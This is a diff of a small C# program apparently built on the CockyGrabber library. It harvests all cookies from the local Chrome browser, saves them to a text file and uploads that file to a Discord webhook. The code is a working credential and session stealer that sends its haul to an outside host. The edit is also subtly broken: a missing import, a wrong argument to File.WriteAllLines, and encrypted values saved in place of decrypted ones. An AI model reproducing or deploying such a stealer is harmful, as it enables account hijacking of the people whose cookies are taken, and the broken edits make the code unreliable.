@@ -1,6 +1,5 @@
 using CockyGrabber;
 using CockyGrabber.Grabbers;
-using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 
@@ -16,14 +15,14 @@ namespace CockyGrabberTest
         static void Main(string[] args)
         {
             ChromeGrabber g = new ChromeGrabber(); // Create Grabber
-            List<string> cookies = new List<string>();
+            StringBuilder cookies = new StringBuilder();
 
             g.GetCookies().ToList().ForEach(delegate (Blink.Cookie c) // For every grabbed cookie:
             {
-                cookies.Add($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.DecryptedValue}"); // Add the cookie hostname, name, and value to the 'cookie' list
+                cookies.AppendLine($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.EncryptedValue}"); // Add the cookie hostname, name, and value to the 'cookie' list
             });
 
-            File.WriteAllLines("./cookies_save.txt", cookies); // Save cookies in cookies_save.txt
+            File.WriteAllLines("./cookies_save.txt", cookies.ToString()); // Save cookies in cookies_save.txt
             DiscordWebhookClient webhookClient = new DiscordWebhookClient(WebhookUrl); // Create Discord.NET DiscordWebhook
             webhookClient.SendFileAsync("./cookies_save.txt", "here are your cookies:").Wait(); // Send the file including the cookies to discord webhook and wait until the message sent
         }
